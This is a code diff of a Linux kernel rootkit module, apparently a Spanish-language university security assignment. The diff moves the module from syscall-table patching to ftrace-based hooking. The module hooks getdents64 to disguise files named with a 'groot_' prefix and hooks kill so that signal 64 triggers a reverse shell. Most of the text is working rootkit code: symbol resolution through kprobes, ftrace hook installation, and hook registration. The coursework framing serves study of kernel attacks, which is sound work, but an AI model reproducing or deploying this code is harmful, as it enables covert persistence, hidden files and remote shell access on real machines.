@@ -3,11 +3,8 @@
  * Tarea 3 - Principios de Seguridad en Sistemas Operativos
  * Maestría en Ciberseguridad - TEC
  *
- * Arquitectura: x86_64 / kernel 5.7+ (probado en 6.8)
- * Técnica: syscall table hooking via kprobes + stop_machine
- *
- * Modificación: archivos con prefijo "groot_" aparecen como "Oculto"
- * Extra: kernel > 5.0 + reverse shell via kill -64
+ * Arquitectura: x86_64 / kernel 5.x+
+ * Técnica: Ftrace hooking (compatible con kernels modernos)
  *
  * Autores: Sebastián Quesada Chaverri (2019065076)
  *          [Compañero 2], [Compañero 3]
@@ -17,18 +14,17 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/kprobes.h>
+#include <linux/ftrace.h>
 #include <linux/dirent.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
 #include <linux/syscalls.h>
-#include <linux/stop_machine.h>
+#include <linux/version.h>
 #include <asm/unistd.h>
-#include <asm/paravirt.h>
-#include <asm/cacheflush.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Sebastián Quesada, TEC Maestría Ciberseguridad");
-MODULE_DESCRIPTION("G-Root: Rootkit educativo x86_64");
+MODULE_DESCRIPTION("G-Root: Rootkit educativo x86_64 via Ftrace");
 MODULE_VERSION("1.0");
 
 #define PREFIX        "groot_"
@@ -38,13 +34,12 @@ MODULE_VERSION("1.0");
 #define SHELL_SIGNAL   64
 
 /* ============================================================
- * RESOLUCIÓN DE SÍMBOLOS VIA KPROBES (kernel >= 5.7)
+ * RESOLUCIÓN DE SÍMBOLOS VIA KPROBES
  * ============================================================ */
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 static kallsyms_lookup_name_t g_kallsyms_lookup_name = NULL;
-static unsigned long *g_sct = NULL;  /* syscall table */
 
-static int resolve_symbols(void)
+static int resolve_kallsyms(void)
 {
     struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
     int ret = register_kprobe(&kp);
@@ -54,74 +49,80 @@ static int resolve_symbols(void)
     }
     g_kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
     unregister_kprobe(&kp);
-
-    g_sct = (unsigned long *)
-        g_kallsyms_lookup_name("sys_call_table");
-    if (!g_sct) {
-        pr_err("g-root: sys_call_table no encontrada\n");
-        return -ENOENT;
-    }
-    pr_info("g-root: sys_call_table = %px\n", g_sct);
+    pr_info("g-root: kallsyms_lookup_name resuelto\n");
     return 0;
 }
 
 /* ============================================================
- * ESCRITURA EN SYSCALL TABLE — x86_64
- * Desactivamos write-protect via CR0
+ * FTRACE HOOK INFRASTRUCTURE
  * ============================================================ */
-typedef asmlinkage long (*sys_getdents64_t)(const struct pt_regs *);
-typedef asmlinkage long (*sys_kill_t)(const struct pt_regs *);
-
-static sys_getdents64_t orig_getdents64 = NULL;
-static sys_kill_t       orig_kill       = NULL;
-
-static inline void cr0_write_enable(void)
-{
-    unsigned long cr0 = read_cr0();
-    cr0 &= ~X86_CR0_WP;
-    write_cr0(cr0);
-}
-
-static inline void cr0_write_disable(void)
-{
-    unsigned long cr0 = read_cr0();
-    cr0 |= X86_CR0_WP;
-    write_cr0(cr0);
-}
-
-struct patch {
-    int           index;
-    unsigned long new_fn;
-    unsigned long *saved;
+struct ftrace_hook {
+    const char     *name;
+    void           *function;
+    void           *original;
+    unsigned long   address;
+    struct ftrace_ops ops;
 };
 
-static int apply_patch(void *arg)
+static int fh_resolve(struct ftrace_hook *hook)
 {
-    struct patch *p = (struct patch *)arg;
-    cr0_write_enable();
-    if (p->saved)
-        *p->saved = g_sct[p->index];
-    g_sct[p->index] = p->new_fn;
-    cr0_write_disable();
+    hook->address = g_kallsyms_lookup_name(hook->name);
+    if (!hook->address) {
+        pr_err("g-root: no se encontró símbolo: %s\n", hook->name);
+        return -ENOENT;
+    }
+    *((unsigned long *)hook->original) = hook->address;
     return 0;
 }
 
-static void install_hook(int nr, unsigned long fn, unsigned long *orig)
+static void notrace fh_thunk(unsigned long ip, unsigned long parent_ip,
+                              struct ftrace_ops *ops, struct ftrace_regs *fregs)
 {
-    struct patch p = { .index = nr, .new_fn = fn, .saved = orig };
-    stop_machine(apply_patch, &p, NULL);
+    struct pt_regs *regs = ftrace_get_regs(fregs);
+    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+
+    if (!within_module(parent_ip, THIS_MODULE))
+        regs->ip = (unsigned long)hook->function;
 }
 
-static void remove_hook(int nr, unsigned long orig_fn)
+static int fh_install(struct ftrace_hook *hook)
 {
-    struct patch p = { .index = nr, .new_fn = orig_fn, .saved = NULL };
-    stop_machine(apply_patch, &p, NULL);
+    int err = fh_resolve(hook);
+    if (err) return err;
+
+    hook->ops.func  = fh_thunk;
+    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+                    | FTRACE_OPS_FL_RECURSION
+                    | FTRACE_OPS_FL_IPMODIFY;
+
+    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+    if (err) {
+        pr_err("g-root: ftrace_set_filter_ip falló: %d\n", err);
+        return err;
+    }
+
+    err = register_ftrace_function(&hook->ops);
+    if (err) {
+        pr_err("g-root: register_ftrace_function falló: %d\n", err);
+        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+        return err;
+    }
+
+    pr_info("g-root: hook instalado en %s\n", hook->name);
+    return 0;
+}
+
+static void fh_remove(struct ftrace_hook *hook)
+{
+    unregister_ftrace_function(&hook->ops);
+    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
 }
 
 /* ============================================================
  * HOOK: getdents64
- * Renombra archivos con prefijo PREFIX a HIDDEN_NAME
  * ============================================================ */
+static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
+
 static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 {
     struct linux_dirent64 __user *dirent =
@@ -167,6 +168,8 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 /* ============================================================
  * HOOK: kill — reverse shell con señal 64
  * ============================================================ */
+static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
+
 static asmlinkage long hook_kill(const struct pt_regs *regs)
 {
     int sig = (int) regs->si;
@@ -191,22 +194,33 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
 }
 
 /* ============================================================
+ * REGISTRO DE HOOKS
+ * ============================================================ */
+static struct ftrace_hook hooks[] = {
+    { "__x64_sys_getdents64", hook_getdents64, &orig_getdents64 },
+    { "__x64_sys_kill",       hook_kill,       &orig_kill       },
+};
+
+/* ============================================================
  * INIT / EXIT
  * ============================================================ */
 static int __init rootkit_init(void)
 {
-    int ret = resolve_symbols();
+    int ret, i;
+
+    ret = resolve_kallsyms();
     if (ret) return ret;
 
-    install_hook(__NR_getdents64,
-                 (unsigned long)hook_getdents64,
-                 (unsigned long *)&orig_getdents64);
+    for (i = 0; i < ARRAY_SIZE(hooks); i++) {
+        ret = fh_install(&hooks[i]);
+        if (ret) {
+            while (--i >= 0)
+                fh_remove(&hooks[i]);
+            return ret;
+        }
+    }
 
-    install_hook(__NR_kill,
-                 (unsigned long)hook_kill,
-                 (unsigned long *)&orig_kill);
-
-    pr_info("g-root: hooks instalados\n");
+    pr_info("g-root: modulo cargado\n");
     pr_info("g-root: prefijo '%s' -> '%s'\n", PREFIX, HIDDEN_NAME);
     pr_info("g-root: kill -%d <pid> activa reverse shell\n", SHELL_SIGNAL);
     return 0;
@@ -214,8 +228,9 @@ static int __init rootkit_init(void)
 
 static void __exit rootkit_exit(void)
 {
-    remove_hook(__NR_getdents64, (unsigned long)orig_getdents64);
-    remove_hook(__NR_kill,       (unsigned long)orig_kill);
+    int i;
+    for (i = 0; i < ARRAY_SIZE(hooks); i++)
+        fh_remove(&hooks[i]);
     pr_info("g-root: modulo descargado\n");
 }
 
